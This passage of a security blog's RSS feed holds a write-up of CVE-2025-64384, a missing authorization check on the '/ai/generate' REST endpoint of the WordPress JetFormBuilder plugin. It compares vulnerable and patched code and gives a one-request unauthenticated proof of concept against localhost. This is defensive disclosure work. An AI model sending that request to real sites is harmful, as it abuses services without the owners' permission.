mechanisms.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Nonce + capability check must always be paired&lt;/strong&gt; to prevent CSRF and privilege escalation issues.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/broken-access-control/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Broken Access Control&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/uipress-lite/vulnerability/wordpress-uipress-lite-plugin-3-5-08-missing-authorization-to-authenticated-subscriber-plugin-settings-update-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress UiPress lite Plugin &amp;lt;= 3.5.08 is vulnerable to Broken Access Control&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-64384 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-12-09-cve-2025-64384/</link>
      <pubDate>Tue, 09 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-12-09-cve-2025-64384/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-09-cve-2025-64384/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;Missing Authorization&lt;/strong&gt; vulnerability in &lt;strong&gt;jetmonsters JetFormBuilder (jetformbuilder)&lt;/strong&gt; allows exploitation via &lt;strong&gt;Incorrectly Configured Access Control Security Levels&lt;/strong&gt;. This issue affects &lt;strong&gt;JetFormBuilder&lt;/strong&gt; from &lt;strong&gt;n/a&lt;/strong&gt; to &lt;strong&gt;&amp;lt;= 3.5.3&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-64384&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-64384&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Broken Access Control&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 3.5.3&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 3.5.4&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (5.3)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/jetformbuilder/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress JetFormBuilder Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; – &lt;strong&gt;JetFormBuilder&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;3.5.3&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;3.5.4&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Perform code diff:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-09-cve-2025-64384/diff.png&#34; title=&#34;Difference between the vulnerable and patched versions&#34; data-thumbnail=&#34;/posts/2025-12-09-cve-2025-64384/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;Difference between the vulnerable and patched versions&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-09-cve-2025-64384/diff.png&#39; alt=&#34;Diff&#34; height=&#34;820&#34; width=&#34;1535&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Difference between the vulnerable and patched versions&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Vulnerable version (v3.5.3):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;The &lt;code&gt;Generate_Form_Endpoint&lt;/code&gt; class contains functions that return the corresponding values used to register the REST API in WordPress:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;route: &lt;code&gt;/ai/generate&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;method: &lt;code&gt;POST&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;callback: &lt;code&gt;run_callback&lt;/code&gt; used to generate forms with AI, with a limit of (15 requests / month)&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-09-cve-2025-64384/ai.png&#34; title=&#34;Form generation with AI&#34; data-thumbnail=&#34;/posts/2025-12-09-cve-2025-64384/ai.png&#34; data-sub-html=&#34;&lt;h2&gt;AI&lt;/h2&gt;&lt;p&gt;Form generation with AI&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-09-cve-2025-64384/ai.png&#39; alt=&#34;AI&#34; height=&#34;875&#34; width=&#34;1026&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Form generation with AI&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;This is the function used to register a new endpoint for the REST API. The basic structure is as follows:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;register_rest_route( &#xA;    string $namespace, &#xA;    string $route, &#xA;    array  $args = array(), &#xA;    bool   $override = false &#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;$namespace&lt;/code&gt;: Namespace for the route, usually the name of the plugin or module.&#xA;Example: &lt;code&gt;&amp;quot;myplugin/v1&amp;quot;&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;$route&lt;/code&gt;: The endpoint path (after the namespace).&#xA;Example: &lt;code&gt;&amp;quot;/items&amp;quot;&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;$args&lt;/code&gt;: Configuration array for the route, including:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;methods&lt;/code&gt;: HTTP methods (GET, POST, PUT, DELETE&amp;hellip;).&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;callback&lt;/code&gt;: Function executed when the endpoint is called.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;permission_callback&lt;/code&gt;: Function to check access permissions.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;args&lt;/code&gt;: (optional) Parameters passed to the endpoint.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;code&gt;$override&lt;/code&gt;: Default is &lt;code&gt;false&lt;/code&gt;. If &lt;code&gt;true&lt;/code&gt;, it will override an existing route.&lt;/p&gt;&#xA;&lt;p&gt;By examining the functions in the &lt;code&gt;Generate_Form_Endpoint&lt;/code&gt; class, we can see that if the API is registered, it lacks the &lt;code&gt;permission_callback&lt;/code&gt; component to check access permissions. This allows all users (including unauthenticated users) to call this endpoint and freely use the AI form generation feature.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Patched version (v3.5.4):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;class Generate_Form_Endpoint extends Rest_Api_Private_Endpoint_Base&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;It indirectly extends &lt;code&gt;Rest_Api_Endpoint_Base&lt;/code&gt; through &lt;code&gt;Rest_Api_Private_Endpoint_Base&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;abstract class Rest_Api_Private_Endpoint_Base extends Rest_Api_Endpoint_Base {&#xA;&#x9;public function check_permission(): bool {&#xA;&#x9;&#x9;return current_user_can( &amp;#39;edit_jet_fb_forms&amp;#39; ); // admin only&#xA;&#x9;}&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;check_permission&lt;/code&gt; is created to override the &lt;code&gt;check_permission&lt;/code&gt; method of &lt;code&gt;Rest_Api_Endpoint_Base&lt;/code&gt;, ensuring that it is restricted to admin users.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;abstract class Rest_Api_Endpoint_Base implements Rest_Fetch_Endpoint {&#xA;    public function check_permission(): bool {&#xA;&#x9;&#x9;return true; // permission_callback: true&#xA;&#x9;}&#xA;    ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;&#xA;&lt;p&gt;The plugin registered an action hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;rest_api_init&amp;#39;, array( $this, &amp;#39;register_routes&amp;#39; ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;rest_api_init&lt;/code&gt;: This hook is triggered when WordPress initializes the &lt;strong&gt;REST API&lt;/strong&gt;, at which point the &lt;code&gt;register_routes&lt;/code&gt; callback is executed:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function register_routes() {&#xA;    foreach ( $this-&amp;gt;routes() as $route ) {&#xA;        $endpoint_args = $route-&amp;gt;get_overridden_args()&#xA;            ?: array(&#xA;                &amp;#39;methods&amp;#39;             =&amp;gt; $route::get_methods(),&#xA;                &amp;#39;callback&amp;#39;            =&amp;gt; array( $route, &amp;#39;run_callback&amp;#39; ),&#xA;                &amp;#39;permission_callback&amp;#39; =&amp;gt; array( $route, &amp;#39;check_permission&amp;#39; ),&#xA;                &amp;#39;args&amp;#39;                =&amp;gt; $route-&amp;gt;get_common_args(),&#xA;            );&#xA;&#xA;        $result = register_rest_route(&#xA;            $route::get_namespace(), // jet-form-builder/v1/&#xA;            &amp;#34;/{$route::get_rest_base()}&amp;#34;,&#xA;            $endpoint_args,&#xA;            $route-&amp;gt;get_override()&#xA;        );&#xA;&#xA;        if ( ! $result ) {&#xA;            _doing_it_wrong(&#xA;                __METHOD__,&#xA;                &amp;#34;Error on register REST API route: {$route::get_namespace()}/{$route::get_rest_base()}&amp;#34;,&#xA;                &amp;#39;1.4.0&amp;#39;&#xA;            );&#xA;        }&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;register_routes&lt;/code&gt; function iterates through each route and calls &lt;code&gt;register_rest_route&lt;/code&gt; to register the API. &lt;code&gt;$this-&amp;gt;routes()&lt;/code&gt; contains the routes registered in two ways:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;By extending &lt;code&gt;Rest_Api_Controller_Base&lt;/code&gt;:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;class Controller extends Rest_Api_Controller_Base {&#xA;    protected $routes = array();&#xA;    public function __construct() {&#xA;        $this-&amp;gt;routes = array(&#xA;            new Get_Form_Fields(),&#xA;            new Install_Migrations_Endpoint(),&#xA;        );&#xA;    }&#xA;&#xA;    public function routes(): array {&#xA;        return $this-&amp;gt;routes;&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;By calling:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$rest_api-&amp;gt;get_controller()-&amp;gt;install( new Generate_Form_Endpoint() );&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;Attacker (Unauthenticated user)&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Send POST request to /wp-json/jet-form-builder/v1/ai/generate&amp;#34;]&#xA;--&amp;gt; C[&amp;#34;WordPress REST API receives request&amp;#34;]&#xA;--&amp;gt; D[&amp;#34;JetFormBuilder register_routes() is triggered via rest_api_init&amp;#34;]&#xA;--&amp;gt; E[&amp;#34;Generate_Form_Endpoint registered with: methods: POST callback: run_callback permission_callback: true (default)&amp;#34;]&#xA;--&amp;gt; F{&amp;#34;Is permission_callback properly defined?&amp;#34;}&#xA;F -- No (&amp;lt;=3.5.3) --&amp;gt; G[&amp;#34;Access granted to all users&amp;#34;]&#xA;G --&amp;gt; H[&amp;#34;run_callback executed → AI form generation&amp;#34;]&#xA;H --&amp;gt; I[&amp;#34;Attacker bypasses intended restriction (15 requests/month)&amp;#34;]&#xA;F -- Yes (&amp;gt;=3.5.4) --&amp;gt; J[&amp;#34;check_permission() requires current_user_can(&amp;#39;edit_jet_fb_forms&amp;#39;)&amp;#34;]&#xA;J --&amp;gt; K[&amp;#34;Only Admin can access → Exploit prevented&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Send a request as an unauthenticated user:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-json/jet-form-builder/v1/ai/generate HTTP/1.1&#xA;Host: localhost&#xA;...&#xA;prompt=create malicious form submit&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-09-cve-2025-64384/resp.png&#34; title=&#34;Result&#34; data-thumbnail=&#34;/posts/2025-12-09-cve-2025-64384/resp.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Result&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-09-cve-2025-64384/resp.png&#39; alt=&#34;Result&#34; height=&#34;600&#34; width=&#34;1492&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Result&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;CVE-2025-64384 stems from the &lt;strong&gt;missing &lt;code&gt;permission_callback&lt;/code&gt;&lt;/strong&gt; for the &lt;code&gt;/ai/generate&lt;/code&gt; REST API in JetFormBuilder &amp;lt;= 3.5.3, allowing &lt;strong&gt;unauthenticated users&lt;/strong&gt; to access the endpoint and abuse the AI-powered form generation feature. Version 3.5.4 fixed this by enforcing a permission check using &lt;code&gt;current_user_can(&#39;edit_jet_fb_forms&#39;)&lt;/code&gt;, restricting access to administrators only and fully eliminating the exploit possibility.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Always define a &lt;code&gt;permission_callback&lt;/code&gt; when registering REST API routes.&lt;/li&gt;&#xA;&lt;li&gt;Never rely on logical limits without proper access control.&lt;/li&gt;&#xA;&lt;li&gt;Inheriting the correct base class can prevent serious security flaws.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/broken-access-control/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Broken Access Control&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a 